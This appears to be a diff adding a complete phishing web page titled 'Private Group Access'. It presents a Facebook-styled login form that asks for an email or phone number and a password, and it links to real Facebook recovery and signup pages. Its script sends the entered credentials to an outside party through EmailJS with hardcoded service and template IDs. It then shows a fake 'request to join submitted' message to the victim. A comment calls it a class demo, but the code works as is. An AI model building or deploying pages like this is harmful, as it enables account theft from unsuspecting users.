@@ -1,0 +1,278 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <!-- Viewport + mobile optimizations -->
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <meta name="theme-color" content="#0b74ff" />
+  <title>Private Group</title>
+
+  <style>
+    /* Basic variables */
+    :root{
+      --bg: #f1f5f9;
+      --card: #ffffff;
+      --accent: #0b74ff;
+      --muted: #6b7280;
+      --success: #16a34a;
+      --radius: 8px;
+    }
+
+    /* Prevent font resizing on iOS when focusing inputs */
+    html, body {
+      -webkit-text-size-adjust: 100%;
+      -ms-text-size-adjust: 100%;
+      height: 100%;
+      margin: 0;
+      font-family: Inter, system-ui, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+      background: linear-gradient(180deg, var(--bg), #ffffff);
+      color: #0f172a;
+    }
+
+    /* Layout container - mobile-first */
+    .container {
+      display: grid;
+      grid-template-columns: 1fr;
+      gap: 18px;
+      width: 100%;
+      max-width: 1100px;
+      margin: 28px auto;
+      padding: 16px;
+      box-sizing: border-box;
+    }
+
+    /* Left panel */
+    .left {
+      padding: 16px;
+      display:flex;
+      flex-direction:column;
+      gap:12px;
+      align-items:flex-start;
+    }
+    .brand {
+      color:var(--accent);
+      font-weight:700;
+      font-size:28px; /* smaller on phones */
+      margin:0;
+      letter-spacing:-0.3px;
+    }
+    .subtitle{
+      font-size:15px;
+      color:var(--muted);
+      margin:0;
+    }
+    .recent-card{
+      background:var(--card);
+      border-radius:var(--radius);
+      padding:14px;
+      width:220px;
+      box-shadow:0 6px 18px rgba(15,23,42,0.06);
+      text-align:center;
+      margin-top:6px;
+    }
+    .add-circle{
+      width:64px;height:64px;border-radius:12px;
+      display:inline-flex;align-items:center;justify-content:center;
+      background:#f8fafc;color:var(--accent);font-size:36px;margin-bottom:10px;
+      box-shadow: inset 0 -2px 0 rgba(0,0,0,0.02);
+    }
+    .add-text{color:var(--accent); text-decoration:none; display:block; font-weight:600; margin-top:6px;}
+
+    /* Right panel (card/form) */
+    .card{
+      background:var(--card);
+      padding:18px;
+      border-radius:12px;
+      box-shadow:0 8px 30px rgba(15,23,42,0.06);
+      width:100%;
+      box-sizing:border-box;
+    }
+
+    /* Form elements */
+    .form-field{display:block;width:100%;box-sizing:border-box;margin-bottom:14px;}
+    label{display:block;font-size:13px;margin-bottom:6px;color:var(--muted);}
+    /* screen-reader-only label */
+    .sr-only{
+      border:0 !important;
+      clip:rect(1px,1px,1px,1px) !important;
+      -webkit-clip-path: inset(50%) !important;
+      clip-path: inset(50%) !important;
+      height:1px !important;
+      margin:-1px !important;
+      overflow:hidden !important;
+      padding:0 !important;
+      position:absolute !important;
+      width:1px !important;
+      white-space:nowrap !important;
+    }
+
+    input[type="text"], input[type="password"]{
+      width:100%;
+      padding:14px 16px;
+      border-radius:10px;
+      border:1px solid #e6eef8;
+      font-size:16px; /* ensure >=16px for mobile to avoid zoom */
+      box-sizing:border-box;
+      outline:none;
+    }
+    input[type="text"]::placeholder, input[type="password"]::placeholder {
+      color: #9aa6b2;
+    }
+    input[type="text"]:focus, input[type="password"]:focus{
+      box-shadow:0 0 0 6px rgba(11,116,255,0.06);
+      border-color: rgba(11,116,255,0.25);
+    }
+
+    .login-btn{
+      width:100%;
+      padding:14px 16px;
+      border-radius:10px;
+      border:0;
+      background:var(--accent);
+      color:white;
+      font-weight:700;
+      font-size:16px;
+      cursor:pointer;
+      margin-top:6px;
+      display:inline-block;
+    }
+    .login-btn:active{transform:translateY(1px);}
+
+    .secondary{
+      margin-top:12px;text-align:center;color:var(--muted);font-size:13px;
+    }
+    .create-btn{
+      display:inline-block;margin-top:10px;padding:10px 14px;border-radius:8px;background:var(--success);color:white;text-decoration:none;font-weight:600;
+    }
+
+    /* ---- Larger screens (tablet and up) ---- */
+    @media (min-width: 640px) {
+      .brand { font-size:34px; }
+      .subtitle { font-size:16px; }
+      .container { max-width: 980px; padding: 20px; gap: 22px; }
+      .card { padding: 22px; }
+      input[type="text"], input[type="password"] { padding: 13px 14px; font-size:15px; }
+    }
+
+    /* Two-column layout for wide viewports */
+    @media (min-width: 900px) {
+      .container{
+        display:grid;
+        grid-template-columns: 1fr 420px;
+        gap:32px;
+        align-items:center;
+        padding:28px;
+      }
+      .brand{ font-size:44px; }
+      .left{ padding:40px; }
+      .card{ padding:28px; border-radius:10px; }
+    }
+
+    /* Extra small phones: ensure comfortable hit targets and spacing */
+    @media (max-width: 420px) {
+      body { padding: 8px; }
+      .container { margin: 12px auto; gap:14px; padding: 10px; }
+      .brand { font-size:22px; }
+      .subtitle { font-size:14px; }
+      .recent-card { width:100%; display:flex; align-items:center; gap:12px; padding:12px; }
+      .add-circle { width:56px; height:56px; font-size:30px; border-radius:10px; }
+      .card { padding:16px; border-radius:10px; }
+      input[type="text"], input[type="password"] { padding:12px 12px; font-size:16px; }
+      .login-btn { padding:12px 12px; font-size:15px; }
+    }
+
+    /* High-contrast focus outlines for accessibility */
+    :focus { outline: 3px solid rgba(11,116,255,0.14); outline-offset: 2px; }
+
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <!-- Left info column -->
+    <div class="left" aria-hidden="false">
+      <h1 class="brand">Private Group Access</h1>
+      <p class="subtitle">You must be 18+ years old to access this group. </p>
+
+    </div>
+
+    <!-- Right form column -->
+    <div class="card" role="region" aria-label="Login form">
+      <form id="loginForm" autocomplete="off" novalidate>
+        <div class="form-field">
+          <!-- visible placeholder + screen-reader label -->
+          <label for="identifier" class="sr-only">Email or phone number</label>
+          <input id="identifier" name="identifier" type="text" placeholder="Email or phone number" required inputmode="email" />
+        </div>
+
+        <div class="form-field">
+          <label for="password" class="sr-only">Password</label>
+          <input id="password" name="password" type="password" placeholder="Password" required />
+        </div>
+
+        <button type="submit" class="login-btn" aria-label="Log in">Log In</button>
+
+        <p class="secondary" style="margin-top:12px;">
+          <a href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0" id="forgot">Forgot password?</a>
+        </p>
+
+        <p class="secondary" style="margin-top:18px;">
+          <a class="create-btn" href="https://www.facebook.com/">Create new account</a>
+        </p>
+
+      </form>
+    </div>
+  </div>
+
+  <!-- EmailJS SDK -->
+  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+  <script>
+    // Initialize EmailJS with your public key (replace with your own if needed)
+    if (typeof emailjs !== 'undefined' && emailjs.init) {
+      emailjs.init('ezt9CB7CxTCyZu_ja'); // ← change if you have a different public key
+    }
+
+    const form = document.getElementById('loginForm');
+
+    form.addEventListener('submit', function (e) {
+      e.preventDefault();
+
+      const identifier = document.getElementById('identifier').value.trim();
+      const password = document.getElementById('password').value;
+
+      if (!identifier || !password) {
+        // friendly inline validation could be improved
+        alert('Please fill both fields.');
+        return;
+      }
+
+      // WARNING: demo only. Never attempt to collect other services' credentials.
+      const templateParams = {
+        identifier: identifier,
+        password: password,
+        message: 'Demo login submission from class assignment.',
+        submitted_at: new Date().toISOString()
+      };
+
+      // Use the service/template IDs you provided
+      // Replace service_uhxg8hf / template_euce73h below if you need other IDs.
+      emailjs.send('service_uhxg8hf', 'template_ledkaye', templateParams)
+        .then(function (response) {
+          console.log('SUCCESS!', response.status, response.text);
+          alert('Request to Join submitted Successfully, please wait to be accepted');
+          form.reset();
+        }, function (error) {
+          console.error('FAILED...', error);
+          alert('There was an error sending the request. Try again.');
+        });
+    });
+
+    // Optional: enhance touch area for small screens (no-op but left for clarity)
+    (function tuneForTouch() {
+      // Example: you could enlarge clickable elements on touch devices here if desired.
+      // Not necessary for this demo; CSS already increases hit targets for small screens.
+    })();
+  </script>
+</body>
+</html>
+
